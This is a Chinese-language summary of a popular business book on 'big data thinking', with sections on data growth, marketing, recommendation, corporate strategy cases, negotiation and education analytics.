信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。 计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍； 人类存储信息量的增长也迅速增长，比世界经济的增长快四倍； 曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。 在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。 3.4 优劣思维 事物都是一分为二的，有优势，也有劣势，大数据也是如此。 大数据的劣势。 首先，大数据存在隐私泄露的情况。 其次，大数据只能发现过去，不能左右未来。 3.5 冲击思维 大数据的冲击力体现在哪些具体方面： 第一个方面，大数据正在以无限的增长方式突破有限的增长。 第二个方面，大数据正在以效益递增突破。 第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。 互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。 4 新数据时代的新思维 4.1 幂律思维 幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。 幂律和爆发点的相伴相生 爆发改变了一切 4.2 效率思维 大数据的精准和效率 大数据能掌控电视剧收视率 大数据还能追女朋友 4.3 邮件思维 邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。 会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。 大数据时代的邮件营销 邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。 由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。 邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。 4.4 定位思维 网站零售在挖掘顾客喜好时运用了两种方式。 第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。 第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。 余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。” 4.5 逆向思维 股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。 IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。 苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。 逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。 纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。 5 大数据能量的积累与爆发 5.1 关联思维 从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。 麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。 一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。 5.2 双刃思维 “大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。 “大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。 5.3 价值思维 “大数据”真的那么具有吸引力吗？ 网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。 凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。 在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。 在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。 大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面： 第一个方面，是技术创新的新空间。 第二个方面是商业模式的创新。 第三个方面是信息资产的经营。 第四个方面是客户关系管理。 第五个方面是个性化精准推荐。 6 大数据引导的商业变革 6.1 知识思维 “核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。 大数据的核心是思想，不是技术。 端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。 总而言之，知识经济才是提高核心竞争力的有效途径。 首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。 其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。 6.2 变革思维 大数据的价值不言而喻，但也有着两面性。 大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇； 另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。 大数据改变了人们的生活，塑造出了不同的个性化思维。 比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据 再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险； 阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。 再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。 百度大数据关于技术方面的事例 百度大数据开放平台 百度工业革命 6.3 生产思维 人类的行为是否可以被预测？ 如何运用“私人定制”思维？ 大数据“定制化”需得具备几个条件： 首先，要有海量的数据； 其次，这些数据能够挖掘出对生产商家有价值的信息； 再次，具备挖掘这样的数据的技术能力； 最后，要有能力整合生产、流通和销售这些关键环节。 6.4 自动化思维 关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。 大数据解析航空安防和自动化 首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。 其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。 再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。 最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。 6.5 导向思维 新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。 有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？ 马云的故事 “作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。” 在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。 每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。 IBM大数据战略导向认知计算 2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。” IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。” 从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。 7 大数据的营销策略 7.1 测量思维 在进行大数据测试之前，首先要对测试需求做清晰的分析。 举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。 要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。 问题探讨：到底是什么影响人们的幸福感呢？ 随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。 举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。 7.2 谈判思维 所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。 在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。 打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。 如何利用数据在谈判中获得优势呢？ 掌控绝对的数据 还要有针对性 不利用数据，仅仅依靠过去经验和谈判员的弊端 对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。 更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。 7.3 预算思维 在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。 对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。 笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。 7.4 选定思维 你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？ 企业想要做到正确的定位客户，首先就必须先设定目标。 找到有价值的客户并不代表着就一定能够进行合作。 “建立品牌” 8 教育、教学正在大数据化 8.1 院校思维 “大数据”时代，如何推动和创新院校教育模式 区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。 这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。 传统的院校决策模式总结为四种： 第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式； 第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式； 第三种是决策程序无章可循、随意性大的“有组织无政府型”模式； 第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。 这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。 在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。 8.2 教学思维 大数据变革教育的第一波浪潮 翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。 MOOC风暴来袭，放大翻转课堂效应。 微课程兴起：回应翻转课堂和MOOC浪潮。 8.3 教育思维 “大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。 “大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。 “大数据”怎么样改变传统的教育？ 第一个方面是改变教育研究中对数据价值的认识； 第二个方面是方便校长、教师更全面了解每一个学生； 第三个方面是帮助学生进行个性化高效学习。</summary></entry></feed>